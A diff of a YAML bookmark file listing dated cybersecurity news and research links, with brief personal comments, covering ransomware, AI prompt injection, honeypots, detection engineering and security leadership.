+      for a startup.
+    link: https://cloud.google.com/blog/topics/threat-intelligence/privileged-account-monitoring/
+  - desc: 'Claude Pirate: Abusing Anthropic''s File API For Data Exfiltration · Embrace
+      The Red Learn about this trick.'
+    link: https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/
+  - desc: 'VPNs from Cisco and Citrix Riskiest Products for Ransomware: At-Bay Rankings
+      Report'
+    link: https://www.at-bay.com/press_releases/vpns-cisco-citrix-riskiest-products-ransomware-rankings-report/
+  - desc: 'Detections as Code in DataDog: How I Built an MVP for a Small Team Do this
+      with Elastic'
+    link: https://www.cyberseccafe.com/p/detections-as-code-in-datadog-how?utm_source=substack&utm_medium=email
+  - desc: The 18 CIS Controls Main CIS Controls
+    link: https://www.cisecurity.org/controls/cis-controls-list
+  - desc: Cryptography behind electronic passports
+    link: https://blog.trailofbits.com/2025/10/31/the-cryptography-behind-electronic-passports/
+- date: '2025-11-03'
+  news-items:
+  - desc: A Friendly Tour of Process Memory on Linux
+    link: https://www.0xkato.xyz/linux-process-memory/
+- date: '2025-10-31'
+  news-items:
+  - desc: CyberSecEval 4 | CyberSecEval 4 CyberSecEval 4
+    link: https://meta-llama.github.io/PurpleLlama/CyberSecEval/
+  - desc: SSH LLM Honeypot caught a real threat actor | AI deception platform [[41.Q3
+      CIS53]]
+    link: https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/?utm_source=tldrinfosec
+  - desc: 'Hacking with AI SASTs: An overview of ‘AI Security Engineers’ / ‘LLM Security
+      Scanners’ for Penetration Testers and Security Teams Try Zeropath AI'
+    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
+- date: '2025-10-29'
+  news-items:
+  - desc: Trust no AI - Prompt Injection.
+    link: https://arxiv.org/abs/2412.06090
+  - desc: Link
+    link: https://bounty.github.com/
+- date: '2025-10-28'
+  news-items:
+  - desc: BALDUR. - Security Consultancy Using this make a tutorial for how not to
+      do security with VibeCoding
+    link: https://baldur.dk/blog/vibecoding-and-the-illusion-of-security.html
+  - desc: Mistakes I see engineers making in their code reviews Incorporate this in
+      code-review skill!
+    link: https://www.seangoedecke.com/good-code-reviews/
+- date: '2025-10-27'
+  news-items:
+  - desc: 'OpenAI Atlas Omnibox Prompt Injection: URLs That Become Jailbreaks Here
+      comes Atlas vulenrabilities.'
+    link: https://neuraltrust.ai/blog/openai-atlas-omnibox-prompt-injection
+  - desc: Maximizing the Value of Indicators of Compromise and Reimagining Their Role
+      in Modern Detection [[CIS-53]] Detection IoCs.
+    link: https://www.magonia.io/blog/maximizing-the-value-of-threat-indicators-and-reimagining-their-role-in-modern-detection/?utm_source=tldrinfosec
+  - desc: Using LLMs as a reverse engineering sidekick Make this to a skill.
+    link: https://blog.talosintelligence.com/using-llm-as-a-reverse-engineering-sidekick/?utm_source=tldrinfosec
+- date: '2025-10-23'
+  news-items:
+  - desc: AICM Implementation & Auditing Guidelines (Frameworks)
+    link: https://cloudsecurityalliance.org/artifacts/aicm-implementation-auditing-guidelines-frameworks
+  - desc: STAR for AI FAQ
+    link: https://cloudsecurityalliance.org/artifacts/star-for-ai-faq
+  - desc: Next.js Security Testing Guide for Bug Hunters and Pentesters
+    link: https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide
+  - desc: '0xflux/Wyrm: The dragon in the dark. A red team post exploitation framework
+      for testing security controls during red team assessments. An open-source, Rust-based
+      post-exploitation red team framework designed to compete with tools like Cobalt
+      Strike, Mythic, and Sliver, featuring: custom below-TLS encryption to defeat
+      perimeter inspection tools, anti-sandbox techniques, dynamic payload generation,
+      IOC encryption to assist in anti-analysis and anti-YARA hardening, and more.'
+    link: https://github.com/0xflux/Wyrm
+  - desc: SSH LLM Honeypot caught a real threat actor | AI deception platform walks
+      through how the LLM-powered honeypot Beelzebub (GitHub) can trick a threat actor
+      into revealing their tactics and infrastructure. Mario configured an SSH-based
+      honeypot and observed the threat actor downloading several binaries
+    link: https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/
+  - desc: '0x4D31/galah: Galah: An LLM-powered web honeypot. I think this idea is
+      very promising- LLMs can simulate high quality deception environments that can
+      be programmatically monitored so high quality TTPs can be automatically extracted.'
+    link: https://github.com/0x4D31/galah
+  - desc: 'AI Gated Loader: Teaching Code to Decide Before It Acts SpectreOps’ John
+      Wotton introduces the idea of “AI gated loaders”, a new approach to shellcode
+      execution that collects telemetry'
+    link: https://specterops.io/blog/2025/10/03/ai-gated-loader-teaching-code-to-decide-before-it-acts/
+  - desc: ICE bought vehicles equipped with fake cell towers to spy on phones ICE
+      tapping in to user phones.
+    link: https://techcrunch.com/2025/10/07/ice-bought-vehicles-equipped-with-fake-cell-towers-to-spy-on-phones/
+  - desc: ICE, Secret Service, Navy All Had Access to Flock's Nationwide Network of
+      Cameras
+    link: https://www.404media.co/ice-secret-service-navy-all-had-access-to-flocks-nationwide-network-of-cameras/
+  - desc: It Takes Only 250 Documents to Poison Any AI Model
+    link: https://www.darkreading.com/application-security/only-250-documents-poison-any-ai-model
+  - desc: Prompt injection to RCE in AI agents
+    link: https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/?utm_source=tldrinfosec
+  - desc: State of Cloud Security
+    link: https://www.datadoghq.com/state-of-cloud-security/?utm_source=tldrinfosec
+  - desc: Unlocking free WiFi on British Airways SNI Loophole
+    link: https://saxrag.com/tech/reversing/2025/06/01/BAWiFi.html?utm_source=tldrinfosec
+  - desc: U.S. and U.K. Take Largest Action Ever Targeting Cybercriminal Networks
+      in Southeast Asia Prince Group taken down with its Crypto.
+    link: https://home.treasury.gov/news/press-releases/sb0278
+- date: '2025-10-21'
+  news-items:
+  - desc: '**MCP Snitch monitors and blocks sketchy AI tool calls before they access
+      your files** Adversis built a macOS app that sits between Claude or Cursor and
+      MCP servers, using AI to flag when tools try touching SSH keys or system directories.'
+    link: https://github.com/Adversis/mcp-snitch
+  - desc: '**MCP Snitch monitors and blocks sketchy AI tool calls before they access
+      your files** Adversis built a macOS app that sits between Claude or Cursor and
+      MCP servers, using AI to flag when tools try touching SSH keys or system directories.'
+    link: https://github.com/Adversis?utm_campaign=unsupervised-learning-no-503&utm_medium=referral&utm_source=newsletter.danielmiessler.com
+- date: '2025-10-17'
+  news-items:
+  - desc: Opportunity Austin – Experience Economic Adrenaline Partner Organization
+    link: https://opportunityaustin.com/
+- date: '2025-10-15'
+  news-items:
+  - desc: Link
+    link: https://x.com/bugcrowd/status/1978506561543680508?s=46
+- date: '2025-10-14'
+  news-items:
+  - desc: Apple now offers $2 million for zero-click RCE vulnerabilities
+    link: https://www.bleepingcomputer.com/news/security/apple-now-offers-2-million-for-zero-click-rce-vulnerabilities/
+  - desc: China Hackers Use Velociraptor IR Tool for Ransomware Velociraptor binary
+      and specified a C2 server in the configuration file.
+    link: https://www.darkreading.com/cybersecurity-operations/chinese-hackers-velociraptor-ir-tool-ransomware-attacks
+- date: '2025-10-10'
+  news-items:
+  - desc: 'Startup Security: Ratios and a 24-Month Hiring Plan Tad Whitaker shares
+      the results of his research in how companies staff security teams, based on
+      interviews with CISOs at companies like Datadog, HashiCorp, Github, Segment,
+      Optimizely, etc. In general, he recommends a 1:40 security:Full Time Employee
+      (FTE) ratio and 1:100 IT:FTE. GitHub had a 1:40 ratio, GitLab 1:24.'
+    link: https://theporkskewer.medium.com/startup-security-ratios-and-a-24-month-hiring-plan-83792b7491af
+  - desc: SOC 2 is dead, long live SOC 2!
+    link: https://blog.grc.engineering/p/soc-2-is-dead-long-live-soc-2
+  - desc: 'Broken Authorization in APIs: Introducing Autoswagger How does auto-swagger
+      work?'
+    link: https://www.intruder.io/research/broken-authorization-apis-autoswagger
+  - desc: Apple PCC is the future of consumer cloud computing we all deserve They
+      spent a surprising amount of time boasting about how they architected a secure-by-design
+      (SbD) and private-by-design (PbD) cloud computing architecture for Apple Intelligence.
+    link: https://sensiblesecurity.xyz/p/apple-pcc-is-the-future-of-cloud
+- date: '2025-10-08'
+  news-items:
+  - desc: Docker makes Hardened Images Catalog affordable for small businesses [[MSSP]]
+    link: https://www.bleepingcomputer.com/news/security/docker-makes-hardened-images-catalog-affordable-for-small-businesses/
+- date: '2025-10-07'
+  news-items:
+  - desc: Link
+    link: https://hackerhermanos.com/azbridge/
+  - desc: Link
+    link: https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing
+  - desc: Link
+    link: https://www.intruder.io/research/shadow-it-risks
+  - desc: Link
+    link: https://fieldeffect.com/products/mdr/15tools
+  - desc: The Trinity of Chaos ransomware group, associated with Lapsus$, Scattered
+      Spider, and ShinyHunters, launched a TOR leak site exposing 39 major firms,
+      including Google, Cisco, and Stellantis, after exploiting Salesforce vulnerabilities
+      via vishing and stolen OAuth tokens, threatening to release over 1.5 billion
+      records if ransoms aren't paid.
+    link: https://securityaffairs.com/182918/cyber-crime/shinyhunters-launches-data-leak-site-trinity-of-chaos-announces-new-ransomware-victims.html
+  - desc: Hacker-Powered Security Report - 9th Edition AI isn’t a future trend in
+      pentesting, it’s the new normal.
+    link: https://www.hackerone.com/report/hacker-powered-security
+  - desc: 'MCP Tools: Attack Vectors and Defense Recommendations for Autonomous Agents
+      — Elastic Security Labs'
+    link: https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations?utm_source=tldrinfosec
+  - desc: 'IMDS Abused: Hunting Rare Behaviors to Uncover Exploits | Wiz Blog Using
+      the same technique, we identified a Server-Side Request Forgery (SSRF) vulnerability
+      being abused in another widely used application: ClickHouse.'
+    link: https://www.wiz.io/blog/imds-anomaly-hunting-zero-day
+  - desc: 'SPQA: The AI-based Architecture That''ll Replace Most Existing Software
+      Attackers will have the advantage for 3-5 years. For less-advanced defender
+      teams, this will take much longer. After that point, AI/SPQA (State, Policy,
+      Questions, Action) will have the additional internal context to give Defenders
+      the advantage.'
+    link: https://danielmiessler.com/blog/spqa-ai-architecture-replace-existing-software
+  - desc: How I Block All 26 Million Of Your Curl Requests FoxMoss demonstrates building
+      a packet filter that fingerprints and blocks TLS connections at the kernel level.
+      The approach uses XDP (Express Data Path) and eBPF to identify clients by their
+      TLS cipher suites, achieving speeds that can handle 26 million packets per second
+      on consumer hardware.
+    link: https://foxmoss.com/blog/packet-filtering/
+  - desc: How I Block All 26 Million Of Your Curl Requests FoxMoss demonstrates building
+      a packet filter that fingerprints and blocks TLS connections at the kernel level.
+      The approach uses XDP (Express Data Path) and eBPF to identify clients by their
+      TLS cipher suites, achieving speeds that can handle 26 million packets per second
+      on consumer hardware.
+    link: https://foxmoss.com/
+- date: '2025-10-04'
+  news-items:
+  - desc: 'CloudFox Workshop: Cloud Enumeration for Penetration Testing [[data/content/2025/Lib13]]
+      Cloud Pentesting.'
+    link: https://bishopfox.com/resources/cloudfox-cloud-enumeration-penetration-testing
+- date: '2025-10-02'
+  news-items:
+  - desc: 'Wrap Up: The Month of AI Bugs · Embrace The Red'
+    link: https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/
+  - desc: 'Hacking with AI SASTs: An overview of ‘AI Security Engineers’ / ‘LLM Security
+      Scanners’ for Penetration Testers and Security Teams'
+    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
+  - desc: CISA 2015 cyber threat info-sharing law lapses amid government shutdown
+    link: https://www.csoonline.com/article/4065998/cisa-2015-cyber-threat-info-sharing-law-lapses-amid-government-shutdown.html
+  - desc: State of Cyber Q3 2025
+    link: https://stiennon.substack.com/p/state-of-cyber-q3-2025
+  - desc: CISA Sounds Alarm on Critical Sudo Flaw Actively Exploited in Linux and
+      Unix Systems
+    link: https://thehackernews.com/2025/09/cisa-sounds-alarm-on-critical-sudo-flaw.html
+  - desc: China-linked hackers use ‘BRICKSTORM’ backdoor to steal IP BRICKSTORM -
+      explainer
+    link: https://therecord.media/china-linked-hackers-brickstorm-backdoor-ip
+  - desc: Building an AWS GuardDuty Alert Triage Agent
+    link: https://dev.to/aws-builders/building-an-aws-guardduty-alert-triage-agent-51e9
+- date: '2025-09-30'
+  news-items:
+  - desc: Essentials for Building Cybersecurity from this blog
+    link: https://www.amazon.com/Cyber-Builders-Essential-Building-Cybersecurity/dp/173823410X
+  - desc: Essentials for Building Cybersecurity from this blog
+    link: https://open.substack.com/pub/ventureinsecurity/p/cybersecurity-has-a-communication
+  - desc: 'Live Demo: Claude Code autonomously investigates Cobalt Strike infection
+      via LimaCharlie MCP'
+    link: https://www.youtube.com/watch?v=3Ecn9SwhClY
+- date: '2025-09-29'
+  news-items:
+  - desc: Obot MCP Gateway MCP Gateway
+    link: https://obot.ai/
+  - desc: Advanced Cyberchef Techniques - Defeating Nanocore Obfuscation With Math
+      and Flow Control
+    link: https://www.embeeresearch.io/advanced-cyberchef-techniques-defeating-nanocore-obfuscation-with-math-and-flow-control/
+- date: '2025-09-28'
+  news-items:
+  - desc: SuperMicro Hack
+    link: https://arstechnica.com/security/2025/09/supermicro-server-motherboards-can-be-infected-with-unremovable-malware/
+- date: '2025-09-27'
+  news-items:
+  - desc: Good CISO / Bad CISO
+    link: https://www.philvenables.com/post/good-ciso---bad-ciso
+  - desc: Pokemon fans call on creators to sue the US govt for “gotta catch ‘em all”
+      ICE propaganda
+    link: https://cybernews.com/news/dhs-promotes-ice-pokemon/?utm_source=tldrinfosec
+  - desc: When LLMs autonomously attack
+    link: https://engineering.cmu.edu/news-events/news/2025/07/24-when-llms-autonomously-attack.html?utm_source=tldrinfosec
+  - desc: 'Fall 2025 NCL 101: Everything you need to know About the NCL'
+    link: https://www.youtube.com/watch?v=B2bRlOwP-8A
+  - desc: 'Meet ShadowLeak: ‘Impossible to detect’ data theft using AI'
+    link: https://www.csoonline.com/article/4059606/meet-shadowleak-impossible-to-detect-data-theft-using-ai.html?utm_source=tldrinfosec
+  - desc: Agenda - HOU.SEC.CON. 2025
+    link: https://web.cvent.com/event/9ba9c5ea-9502-44a2-922e-d026c047c9f3/websitePage:dd3dff4f-9597-4a4b-960e-eb732a9a3853?rp=7fc495f3-0ae2-4b86-a115-0ce784642a9f
+  - desc: 'danielmiessler/PAI: Personal AI Infrastructure for upgrading humans.'
+    link: https://github.com/danielmiessler/PAI
+  - desc: Samsung patches zero-day security flaw used to hack into its customers'
+      phones
+    link: https://techcrunch.com/2025/09/16/samsung-patches-zero-day-security-flaw-used-to-hack-into-its-customers-phones/
+  - desc: Global Peace Index Map » The Most & Least Peaceful Countries
+    link: https://www.visionofhumanity.org/maps/#/
+- date: '2025-09-24'
+  news-items:
+  - desc: Gamma Example pitch-deck
+    link: https://gamma.app/docs/Autonomous-AI-Red-Team-for-Continuous-Security-Testing-xwlb53nvgcxxv9v?mode=doc
+  - desc: PromptArmor Prompt Armor
+    link: https://www.promptarmor.com/
+  - desc: Intelligent Automation Powered by Legion Workforce Management Platform Great
+      meeting with Legion
+    link: https://legion.co/
+- date: '2025-09-22'
+  news-items:
+  - desc: for Fully Homomorphic Encryption]
+    link: https://fhetextbook.github.io/
+- date: '2025-09-18'
+  news-items:
+  - desc: What Makes System calls expensive - system research
     link: https://blog.codingconfessions.com/p/what-makes-system-calls-expensive
-  - desc: Security researchers demonstrate novel data exfiltration techniques using
-      Discord and Slack platforms to hide command and control traffic from detection
-      systems.
+  - desc: Novel way to exfiltrate - security researcher
     link: https://arszilla.com/hiding-your-c2-traffic-with-discord-and-slack
-  - desc: Comprehensive AWS CloudTrail event cheatsheet provides detection engineers
-      with critical API calls for identifying security incidents and threats.
+  - desc: Cloud Security Cheatsheet - cloud security [[CIS-52]]
     link: https://aws.plainenglish.io/aws-cloudtrail-event-cheatsheet-a-detection-engineers-guide-to-critical-api-calls-part-1-04fb1588556f
-  - desc: SuperAlign launches end-to-end AI security platform addressing the growing
-      need for comprehensive artificial intelligence risk management and protection.
+  - desc: AI Security end to end - hot startup - hot startup
     link: https://superalign.ai/
-  - desc: Legion Security introduces AI-powered SOC analyst automation platform designed
-      to enhance security operations center efficiency and threat response capabilities.
+  - desc: SOC Analyst automation - AI Startup - hot startup
     link: https://www.legionsecurity.ai/about
-  - desc: Industry analysis explores the future of working with AI agents, highlighting
-      the transition toward prompt-less interactions and autonomous system operations.
+  - desc: How to Work With AI Agents Future is prompt-less
     link: https://builtin.com/articles/work-with-ai-agents
-  - desc: Comprehensive overview of the current state of AI security landscape as
-      of September 2025, covering emerging threats and protection strategies.
+  - desc: State of AI Security. September 18, 2025
     link: https://www.youtube.com/watch?v=xSAvMK_kDAs
-  - desc: Technical deep-dive into container filesystem architecture demonstrates
-      how to build Docker-like containers from scratch for better security understanding.
+- date: '2025-09-17'
+  news-items:
+  - desc: 'How Container Filesystem Works: Building a Docker-like Container From Scratch'
     link: https://labs.iximiuz.com/tutorials/container-filesystem-from-scratch
-  - desc: Binary Exploitation 101 provides foundational knowledge for understanding
-      and defending against binary-based security vulnerabilities and attack vectors.
+  - desc: Binary Exploitation 101
     link: https://r1ru.github.io/categories/binary-exploitation-101/
-  - desc: StepSecurity reports major supply chain attack affecting ctrl/tinycolor
-      and over 40 NPM packages, highlighting risks in open-source dependency management.
+- date: '2025-09-16'
+  news-items:
+  - desc: ctrl/tinycolor and 40+ NPM Packages Compromised - StepSecurity
     link: https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
-  - desc: Amazon security engineer shares valuable lessons learned from interview
-      rejection, providing insights into cloud security interview preparation and
-      expectations.
+- date: '2025-09-15'
+  news-items:
+  - desc: 'What I Learned From Getting Rejected by Amazon: A Security Engineer’s Interview
+      Experience Cloud Security Interviews.'
     link: https://medium.com/@yuvasurya1998/what-i-learned-from-getting-rejected-by-amazon-a-security-engineers-interview-experience-293e65a2f942
-  - desc: Major data leak reveals 600 GB of alleged Great Firewall of China data,
-      representing the largest breach of Chinese internet censorship infrastructure
-      to date.
+  - desc: 600 GB of Alleged Great Firewall of China Data Published in Largest Leak
+      Yet
     link: https://hackread.com/great-firewall-of-china-data-published-largest-leak/?utm_source=tldrinfosec
-  - desc: Electronic Frontier Foundation updates Panopticlick 3.0 tool for testing
-      browser privacy and tracking protection capabilities against online surveillance.
+- date: '2025-09-09'
+  news-items:
+  - desc: Panopticlick 3.0
     link: https://www.eff.org/deeplinks/2017/11/panopticlick-30
-  - desc: University of Cincinnati offers comprehensive malware analysis course covering
-      static and dynamic analysis techniques for cybersecurity professionals.
+  - desc: CS6038-Malware-Analysis by snus
     link: http://class.snusbaum.com/
-  - desc: Qantas reduces executive bonuses by 15% following July data breach, demonstrating
-      corporate accountability for cybersecurity incidents.
+  - desc: Qantas cuts executive bonuses by 15% after a July data breach
     link: https://securityaffairs.com/181954/data-breach/qantas-cuts-executive-bonuses-by-15-after-a-july-data-breach.html
-  - desc: Apple Security Research publishes comprehensive blog on Memory Integrity
-      Enforcement, outlining complete vision for memory safety across Apple device
-      ecosystem.
+  - desc: 'Blog - Memory Integrity Enforcement: A complete vision for memory safety
+      in Apple devices - Apple Security Research'
     link: https://security.apple.com/blog/memory-integrity-enforcement/
-  - desc: Anthropic releases Claude Code security review prompt templates to help
-      developers implement security-focused code analysis workflows.
+  - desc: Claude Code Security Prompt
     link: https://github.com/anthropics/claude-code-security-review/blob/68982a6bf10d545e94dd0390af08306d94ef684c/.claude/commands/security-review.md
-  - desc: Semgrep explores effectiveness of large language model security prompts
-      using promptfoo framework for automated testing and validation.
+  - desc: Security Prompt
     link: https://semgrep.dev/blog/2024/does-your-llm-thing-work-how-we-use-promptfoo
-  - desc: Daniel Miessler's security newsletter covers latest threats, vulnerabilities,
-      and defensive strategies in the cybersecurity landscape.
+  - desc: Security news - Kai
     link: https://newsletter.danielmiessler.com/p/ul-497
-  - desc: BleepingComputer reports AI tools reduce vCISO workload by 68% as demand
-      for virtual security leadership services continues to skyrocket.
+  - desc: AI Cuts vCISO Workload by 68% as Demand Skyrockets, New Report Finds
     link: https://www.bleepingcomputer.com/news/security/ai-cuts-vciso-workload-by-68-percent-as-demand-skyrockets-new-report-finds/
-  - desc: Wikipedia article explores Kryptos, the encrypted sculpture at CIA headquarters,
-      offering insights into cryptographic puzzles and code-breaking challenges.
+  - desc: Kryptos - Wikipedia Puzzles
     link: https://en.wikipedia.org/wiki/Kryptos
-  - desc: 2025 NICE K-12 Cybersecurity Conference announces presenter lineup focusing
-      on cybersecurity education and workforce development initiatives.
+  - desc: 2025 NICE PRESENTER LINE UP
     link: https://www.k12cybersecurityconference.org/2025-presenter-lineup
-  - desc: Domain Tools analyzes the Kimsuky leak, revealing North Korea's credential
-      theft playbook and advanced persistent threat tactics used by state-sponsored
-      hackers.
+- date: '2025-09-06'
+  news-items:
+  - desc: 'Inside the Kimsuky Leak: How the “Kim” Dump Exposed North Korea’s Credential
+      Theft Playbook Tools of trade.'
     link: https://dti.domaintools.com/inside-the-kimsuky-leak-how-the-kim-dump-exposed-north-koreas-credential-theft-playbook/
-  - desc: Mixeway introduces Flow, an open-source DevSecOps platform serving as a
-      comprehensive toolkit for security integration in development workflows.
+  - desc: 'Mixeway/Flow: Repository containing source code of MixewayFlow service
+      that is Swiss army knife for DevSecOps Teams'
     link: https://github.com/Mixeway/Flow
-  - desc: Security researcher demonstrates how specific music compositions can expose
-      vulnerabilities and break AI language models through novel attack vectors.
+  - desc: Music to Break Models By
     link: https://matthodges.com/posts/2025-08-26-music-to-break-models-by/
-  - desc: CrowdStrike announces acquisition of Onum to enhance agentic Security Operations
-      Center capabilities and autonomous threat response systems.
+  - desc: CrowdStrike to Acquire Onum to Transform the Agentic SOC
     link: https://www.crowdstrike.com/en-us/blog/crowdstrike-to-acquire-onum/
-  - desc: CSO Online investigates the Coinbase security breach caused by employee
-      bribery, highlighting insider threats as emerging enterprise security risk.
+- date: '2025-09-02'
+  news-items:
+  - desc: 'Behind the Coinbase breach: Bribery emerges as enterprise threat'
     link: https://www.csoonline.com/article/4042522/behind-the-coinbase-breach-bribery-is-an-emerging-enterprise-threat.html
-  - desc: AWS detection engineering guide helps security teams master log sources
-      and implement effective threat detection strategies in cloud environments.
+  - desc: 'AWS Detection Engineering: Mastering Log Sources for Threat Detection [[CIS-52]]'
     link: https://aws.plainenglish.io/aws-detection-engineering-mastering-log-sources-for-threat-detection-51372da9a17e
-  - desc: Checkmarx introduces AIVSS (AI Vulnerability Scoring System) to address
-      security assessment gaps in AI agents and machine learning systems.
+  - desc: CVSS is Built for Code, Not AI Agents. Now AIVSS Closes the Gap
     link: https://checkmarx.com/ai-llm-tools-in-application-security/cvss-was-built-for-code-not-ai-agents-now-aivss-closes-the-gap/
-  - desc: Security community calls for contributions to help shape AIVSS framework
-      for standardizing AI and LLM vulnerability assessment methodologies.
+  - desc: AIVSS Call for Contribution!
     link: https://kenhuangus.substack.com/p/call-for-contributions-help-shape
-  - desc: Developer blog explores how Rust programming language provides unexpected
-      productivity benefits while maintaining strong security and memory safety guarantees.
+  - desc: The unexpected productivity boost of Rust
     link: https://lubeno.dev/blog/rusts-productivity-curve?=&aid=reccyFDQXujhuj11b
-  - desc: TL;DR Security provides CISO guidance on protecting organizational crown
-      jewels by focusing on intent over specific security tactics and tools.
+  - desc: 'Intent Over Tactics: A CISO''s Guide to Protecting Your Crown Jewels Identify
+      your Crown Jewels'
     link: https://tldrsec.com/p/intent-over-tactics-crown-jewels
-  - desc: Cryptographic puzzle challenge tests problem-solving skills and security
-      knowledge through complex mathematical and logical riddles.
+  - desc: A puzzle to solve
     link: https://x.com/itsalfredw/status/1962919483011695020?s=12
-  - desc: Curated collection of specialized job boards for cybersecurity professionals
-      seeking career opportunities across various security disciplines and experience
-      levels.
+  - desc: Security jobboards
     link: https://x.com/teriradichel/status/1695474651550364058?s=12
-  - desc: Newsweek reports on hackers issuing ultimatum to Google demanding termination
-      of security researchers following major data breach incident.
+  - desc: Hackers want Google to fire its security researchers
     link: https://www.newsweek.com/hackers-issue-ultimatum-data-breach-2122489
-  - desc: CISO guidance framework for evaluating and selecting AI security vendors,
-      covering due diligence processes and vendor assessment criteria.
+- date: '2025-08-29'
+  news-items:
+  - desc: A CISO’s Guide to Vetting AI Security Vendors
     link: https://calebsima.com/2025/08/29/a-cisos-guide-to-vetting-ai-security-vendors/
 - date: '2025-08-26'
   news-items:
-  - desc: SpyVPN, a Google-featured VPN application, has been discovered to secretly
-      capture users' screen content while operating. Security researchers revealed
-      this privacy violation in a detailed analysis of the malicious VPN service.
-    link: https://www.koi.security/blog/spyvpn-the-vpn-that-secretly-captures-your-screen
-  - desc: Security researcher successfully identified and reported critical vulnerabilities
-      in McDonald's systems, noting that finding their security contact proved more
-      challenging than discovering the actual flaws. The investigation highlights
-      common issues with corporate security reporting processes.
-    link: https://bobdahacker.com/blog/mcdonalds-security-vulnerabilities
-  - desc: A new zero-day startup has announced a $20 million bounty program for exploit
-      tools capable of compromising any smartphone device. The initiative represents
-      a significant investment in mobile security research and vulnerability discovery.
-    link: https://techcrunch.com/2025/08/20/new-zero-day-startup-offers-20-million-for-tools-that-can-hack-any-smartphone/
-  - desc: Strix is an open-source AI-powered security testing framework designed to
-      automatically identify vulnerabilities in applications. The tool provides automated
-      penetration testing capabilities for modern software development workflows.
-    link: https://github.com/usestrix/strix
-  - desc: Russian hackers successfully compromised and gained control of a Norwegian
-      dam system, releasing over 1.9 million gallons of water before the attack was
-      detected. The incident highlights critical infrastructure vulnerabilities to
-      state-sponsored cyber attacks.
-    link: https://www.tomshardware.com/tech-industry/cyber-security/russia-hacked-and-took-control-of-a-norwegian-dam-police-chief-claims-released-over-1-900-000-gallons-of-water-before-attack-was-noticed
-  - desc: Analysis examines whether Claude Code's automated security review capabilities
-      meet industry standards for effective vulnerability detection. The assessment
-      evaluates AI-driven code analysis tools against traditional security review
-      methodologies.
+  - desc: Docker Fixes CVE-2025-9074, Critical Container Escape Vulnerability With
+      CVSS Score 9.3 Good example of a CVE
+    link: https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html
+  - desc: Farmers Insurance Data Breach Impacts Over 1 Million People
+    link: https://www.securityweek.com/farmers-insurance-data-breach-impacts-over-1-million-people/
+- date: '2025-08-25'
+  news-items:
+  - desc: Do Claude Code Security Reviews Pass Vibe Check
     link: https://www.darkreading.com/application-security/do-claude-code-security-reviews-pass-vibe-check
-  - desc: FACADE introduces a high-precision insider threat detection system utilizing
-      contrastive learning techniques, presented at Black Hat USA 2025. The framework
-      aims to identify malicious insider activities with improved accuracy and reduced
-      false positives.
+  - desc: FACADE High-Precision Insider Threat Detection Using Contrastive Learning
+      | Black Hat USE 25 talk
     link: https://elie.net/talk/facade-high-precision-insider-threat-detection-using-contrastive-learning
-  - desc: Research demonstrates how agentic AI browsers can be manipulated by sophisticated
-      scam tactics, revealing new attack vectors against autonomous web agents. The
-      study shows AI systems clicking malicious links, making unauthorized payments,
-      and falling for deceptive schemes.
+  - desc: '"Scamlexity": When Agentic AI Browsers Get Scammed'
     link: https://guard.io/labs/scamlexity-we-put-agentic-ai-browsers-to-the-test-they-clicked-they-paid-they-failed
-  - desc: Cybercriminals are now crafting phishing emails specifically designed to
-      bypass both human users and AI-powered security defenses. This evolution in
-      attack methodology targets the dual-layer protection systems commonly deployed
-      in modern organizations.
+  - desc: Phishing Emails Are Now Aimed at Users and AI Defenses
     link: https://malwr-analysis.com/2025/08/24/phishing-emails-are-now-aimed-at-users-and-ai-defenses/
-  - desc: BaxBench provides a comprehensive benchmark for evaluating whether large
-      language models can generate secure and functionally correct backend code. The
-      framework tests LLMs' ability to produce production-ready server-side applications
-      without security vulnerabilities.
-    link: https://baxbench.com/
-  - desc: Invariant Labs introduces comprehensive documentation for securing AI agents
-      through rule-based guardrails and safety mechanisms. The framework provides
-      developers with tools to implement robust security controls for autonomous AI
-      systems.
-    link: https://explorer.invariantlabs.ai/docs/guardrails/
-  - desc: AWS publishes guidance for establishing secure malware analysis environments
-      on their cloud platform, covering isolation, monitoring, and containment strategies.
-      The documentation provides security practitioners with best practices for safely
-      analyzing malicious software in cloud environments.
+- date: '2025-08-23'
+  news-items:
+  - desc: 'SpyVPN: The Google-Featured VPN That Secretly Captures Your Screen | Koi
+      Blog'
+    link: https://www.koi.security/blog/spyvpn-the-vpn-that-secretly-captures-your-screen
+  - desc: How I Hacked McDonald's (Their Security Contact Was Harder to Find Than
+      Their Secret Sauce Recipe)
+    link: https://bobdahacker.com/blog/mcdonalds-security-vulnerabilities
+  - desc: New zero-day startup offers $20 million for tools that can hack any smartphone
+    link: https://techcrunch.com/2025/08/20/new-zero-day-startup-offers-20-million-for-tools-that-can-hack-any-smartphone/
+- date: '2025-08-20'
+  news-items:
+  - desc: 'Malware analysis on AWS: Setting up a secure environment'
     link: https://aws.amazon.com/blogs/security/malware-analysis-on-aws-setting-up-a-secure-environment/
-  - desc: CSO Online provides comprehensive coverage of the latest cybersecurity news
-      and insights from Black Hat 2025. The compilation includes key takeaways from
-      conference presentations and emerging security trends.
+  - desc: 'Black Hat 2025: Latest news and insights Blackhat news.'
     link: https://www.csoonline.com/article/3482049/black-hat-latest-news-and-insights.html?utm_source=tldrinfosec
-  - desc: ArchWiki provides detailed instructions for installing Arch Linux as a guest
-      virtual machine on Proxmox virtualization platform. The guide covers security
-      considerations and best practices for virtualized Linux deployments.
+- date: '2025-08-19'
+  news-items:
+  - desc: 'usestrix/strix: ✨ Open-source AI hackers for your apps 👨🏻‍💻 AI Pentester.'
+    link: https://github.com/usestrix/strix
+  - desc: Russia hacked and took control of a Norwegian dam, police chief claims —
+      released over 1,900,000 gallons of water before attack was noticed
